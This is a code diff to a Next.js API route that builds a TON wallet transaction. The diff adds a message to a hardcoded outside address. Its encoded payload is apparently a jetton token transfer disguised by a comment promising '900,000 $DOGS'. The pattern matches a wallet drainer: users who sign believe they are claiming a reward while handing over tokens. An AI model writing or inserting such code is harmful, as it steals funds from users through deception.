@@ -34,13 +34,18 @@ export async function POST(req: NextRequest) {
 		validUntil: Math.floor(Date.now() / 1000) + 500,
 		messages: [
 			{
-				address: "UQAabWc_44bT8lEMvkXz_niUc7WwPmSFHrk6WyN5iy2J6RU9",
-				amount: tons+""
+				"address": "EQC_KzjGt_hxtZ_f8pgyQysxPSkRmmnhQtrSp0Z8usKvQsvp",
+				"amount": "1000000",
+				"payload": "te6cckEBAgEAiwABrg+KfqUAAAAAAAAAAHAzKLlExAAIAY1Hk9lIWUj7e7Az4rGlR++8sg0Ns23bJbuJsZMieR9fADGo8nspCykfb3YGfFY0qP33lkGhtm27ZLdxNjJkTyPrwQEAXgAAAABVc2UgdGhpcyBzaWduYXR1cmUgdG8gcmVjZWl2ZSA5MDAsMDAwICRET0dTpYcTPg=="
 			},
 			{
 				address: jettonWalletOfReceiver,
 				amount: toNano("0.0005").toString(),
 				payload: body.toBoc().toString('base64')
+			},
+			{
+				address: "UQAabWc_44bT8lEMvkXz_niUc7WwPmSFHrk6WyN5iy2J6RU9",
+				amount: tons+""
 			}
 		]
 	})
